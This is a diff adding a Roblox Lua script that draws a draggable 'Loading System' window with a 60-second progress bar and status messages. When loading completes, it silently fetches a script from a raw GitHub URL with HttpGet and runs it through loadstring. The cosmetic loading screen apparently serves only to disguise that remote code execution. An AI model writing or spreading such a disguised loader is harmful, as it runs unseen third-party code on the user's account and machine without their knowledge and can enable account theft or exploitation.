@@ -1,0 +1,181 @@
+-- SERVICES
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+------------------------------------------------
+-- GUI SETUP
+------------------------------------------------
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LoadingOnlyGui"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 360, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -180, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(18, 28, 40)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 16)
+corner.Parent = mainFrame
+
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 50, 75)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 20, 35))
+}
+gradient.Rotation = 90
+gradient.Parent = mainFrame
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(120, 200, 255)
+stroke.Thickness = 1.5
+stroke.Transparency = 0.4
+stroke.Parent = mainFrame
+
+------------------------------------------------
+-- TITLE
+------------------------------------------------
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 45)
+title.BackgroundTransparency = 1
+title.Text = "Loading System"
+title.TextColor3 = Color3.fromRGB(230, 245, 255)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.Parent = mainFrame
+
+------------------------------------------------
+-- LOADING TEXT
+------------------------------------------------
+
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, -40, 0, 60)
+loadingText.Position = UDim2.new(0, 20, 0.45, -30)
+loadingText.BackgroundTransparency = 1
+loadingText.TextWrapped = true
+loadingText.Text = "Initializing..."
+loadingText.TextColor3 = Color3.fromRGB(180, 230, 255)
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 17
+loadingText.Parent = mainFrame
+
+------------------------------------------------
+-- LOADING BAR
+------------------------------------------------
+
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.85, 0, 0, 10)
+barBg.Position = UDim2.new(0.075, 0, 0.72, 0)
+barBg.BackgroundColor3 = Color3.fromRGB(25, 40, 60)
+barBg.BorderSizePixel = 0
+barBg.Parent = mainFrame
+
+local barCorner = Instance.new("UICorner")
+barCorner.CornerRadius = UDim.new(1, 0)
+barCorner.Parent = barBg
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(120, 200, 255)
+barFill.BorderSizePixel = 0
+barFill.Parent = barBg
+
+local fillCorner = Instance.new("UICorner")
+fillCorner.CornerRadius = UDim.new(1, 0)
+fillCorner.Parent = barFill
+
+------------------------------------------------
+-- LOADING SEQUENCE
+------------------------------------------------
+
+local messages = {
+	"Loading assets...",
+	"Preparing interface...",
+	"Syncing data...",
+	"Finalizing...",
+	"Almost done..."
+}
+
+-- Change text every 5 seconds
+task.spawn(function()
+	for i = 1, #messages do
+		loadingText.Text = messages[i]
+		task.wait(5)
+	end
+end)
+
+------------------------------------------------
+-- TWEEN (60 seconds)
+------------------------------------------------
+
+local loadingTween = TweenService:Create(
+	barFill,
+	TweenInfo.new(60, Enum.EasingStyle.Linear),
+	{ Size = UDim2.new(1, 0, 1, 0) }
+)
+
+loadingTween:Play()
+
+------------------------------------------------
+-- FUNCTION THAT RUNS AFTER LOADING
+------------------------------------------------
+
+local function ExecuteAfterLoading()
+	loadingText.Text = "Loading Complete! ✅"
+	barBg.Visible = false
+	
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/poshlishnertas/newgr/refs/heads/main/dapdap'))()
+	print("Your system has started successfully.")
+end
+
+loadingTween.Completed:Connect(function()
+	ExecuteAfterLoading()
+end)
+
+------------------------------------------------
+-- DRAG SYSTEM
+------------------------------------------------
+
+local dragging = false
+local dragStart
+local startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	mainFrame.Position = UDim2.new(
+		startPos.X.Scale,
+		startPos.X.Offset + delta.X,
+		startPos.Y.Scale,
+		startPos.Y.Offset + delta.Y
+	)
+end
+
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+		update(input)
+	end
+end)
